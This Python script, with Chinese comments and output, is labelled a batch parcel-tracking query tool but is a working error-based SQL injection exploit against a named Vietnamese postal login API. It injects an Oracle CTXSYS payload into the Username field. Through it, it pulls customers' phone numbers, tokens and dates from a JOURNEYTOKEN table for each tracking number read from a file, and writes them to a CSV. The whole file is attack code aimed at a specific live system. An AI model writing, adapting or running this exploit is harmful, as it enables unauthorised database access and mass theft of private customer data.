#!/usr/bin/env python3
"""
批量查询运单号详细信息
使用方法: python3 batch_query_tracking.py key.txt
"""

import requests
import json
import time
import csv
import sys
from datetime import datetime

class BatchTrackingQuery:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0'
        })
    
    def inject(self, payload):
        data = {"Username": payload, "Password": "test"}
        try:
            return self.session.post(self.target_url, data=json.dumps(data), timeout=30)
        except:
            return None
    
    def extract_via_error(self, query):
        payload = (
            f"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND "
            f"1325=CTXSYS.DRITHSX.SN(1325,"
            f"(CHR(113)||CHR(106)||CHR(118)||CHR(106)||CHR(113)||"
            f"({query})||"
            f"CHR(113)||CHR(107)||CHR(118)||CHR(122)||CHR(113))))||'"
        )
        
        response = self.inject(payload)
        if response:
            text = response.text
            try:
                if 'qjvjq' in text and 'qkvzq' in text:
                    start = text.index('qjvjq') + 5
                    end = text.index('qkvzq', start)
                    return text[start:end]
            except:
                pass
        return None
    
    def query_tracking_info(self, tracking_number):
        """查询单个运单号的详细信息"""
        info = {
            'TrackingNumber': tracking_number,
            'Phone': '',
            'Token': '',
            'Date': '',
            'Status': 'Not Found'
        }
        
        # 在JOURNEYTOKEN表查询
        query = f"SELECT ITEMCODE||'|'||PHONE||'|'||TOKEN||'|'||TOKENDATE FROM EMS.JOURNEYTOKEN_ZNS WHERE ITEMCODE='{tracking_number}' AND ROWNUM=1"
        result = self.extract_via_error(query)
        
        if result and result != 'NULL':
            parts = result.split('|')
            if len(parts) >= 4:
                info['Phone'] = parts[1] if len(parts) > 1 else ''
                info['Token'] = parts[2] if len(parts) > 2 else ''
                info['Date'] = parts[3] if len(parts) > 3 else ''
                info['Status'] = 'Found'
        
        return info
    
    def batch_query(self, tracking_numbers):
        """批量查询"""
        print(f"\n📊 开始批量查询 {len(tracking_numbers)} 个运单号...")
        print(f"进度：", end='', flush=True)
        
        results = []
        
        for i, tracking_number in enumerate(tracking_numbers, 1):
            tracking_number = tracking_number.strip()
            
            if not tracking_number:
                continue
            
            # 查询信息
            info = self.query_tracking_info(tracking_number)
            results.append(info)
            
            # 显示进度
            if i % 10 == 0:
                print(f"\n  {i}/{len(tracking_numbers)} ({i*100//len(tracking_numbers)}%)", end='', flush=True)
            
            # 控制速度
            time.sleep(0.2)
        
        return results
    
    def save_results(self, results, output_file):
        """保存结果"""
        if not results:
            print("\n❌ 没有结果可保存")
            return
        
        with open(output_file, 'w', newline='', encoding='utf-8') as f:
            writer = csv.DictWriter(f, fieldnames=['TrackingNumber', 'Phone', 'Token', 'Date', 'Status'])
            writer.writeheader()
            writer.writerows(results)
        
        # 统计
        found = sum(1 for r in results if r['Status'] == 'Found')
        not_found = len(results) - found
        
        print(f"\n\n✅ 查询完成！")
        print(f"📁 结果文件: {output_file}")
        print(f"📊 统计:")
        print(f"   总数: {len(results)}")
        print(f"   找到: {found}")
        print(f"   未找到: {not_found}")
        
        # 显示前10个结果
        print(f"\n前10个结果预览:")
        for i, r in enumerate(results[:10], 1):
            print(f"  {i}. {r['TrackingNumber']}")
            print(f"     电话: {r['Phone']}")
            print(f"     日期: {r['Date']}")
            print(f"     状态: {r['Status']}")
    
    def run(self, input_file):
        """执行批量查询"""
        print("=" * 80)
        print("📦 批量运单号查询工具")
        print("=" * 80)
        
        # 1. 读取文件
        print(f"\n📂 读取文件: {input_file}")
        
        try:
            with open(input_file, 'r', encoding='utf-8') as f:
                tracking_numbers = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"❌ 文件不存在: {input_file}")
            return
        
        print(f"✅ 读取到 {len(tracking_numbers)} 个运单号")
        
        # 显示前5个
        print(f"\n前5个运单号:")
        for i, t in enumerate(tracking_numbers[:5], 1):
            print(f"  {i}. {t}")
        
        # 2. 连接测试
        print(f"\n🔌 连接数据库...")
        if not self.inject("admin"):
            print("❌ 连接失败")
            return
        print("✅ 连接成功")
        
        # 3. 批量查询
        results = self.batch_query(tracking_numbers)
        
        # 4. 保存结果
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_file = f'/workspace/query_results_{timestamp}.csv'
        self.save_results(results, output_file)
        
        print("\n" + "=" * 80)
        print("✅ 任务完成！")
        print("=" * 80)

if __name__ == "__main__":
    print("""
╔══════════════════════════════════════════════════════════════╗
║              批量运单号查询工具 v1.0                         ║
║                                                              ║
║  功能: 批量查询运单号详细信息                                ║
║  输入: key.txt（每行一个运单号）                             ║
║  输出: query_results_YYYYMMDD_HHMMSS.csv                    ║
╚══════════════════════════════════════════════════════════════╝
    """)
    
    # 检查参数
    if len(sys.argv) < 2:
        print("使用方法: python3 batch_query_tracking.py key.txt")
        print("\n示例 key.txt 格式:")
        print("EA044826727VN")
        print("EG044557336VN")
        print("ES072634095VN")
        sys.exit(1)
    
    input_file = sys.argv[1]
    target_url = "https://customerconnect.ems.com.vn/api/User_Customer/Login"
    
    querier = BatchTrackingQuery(target_url)
    querier.run(input_file)
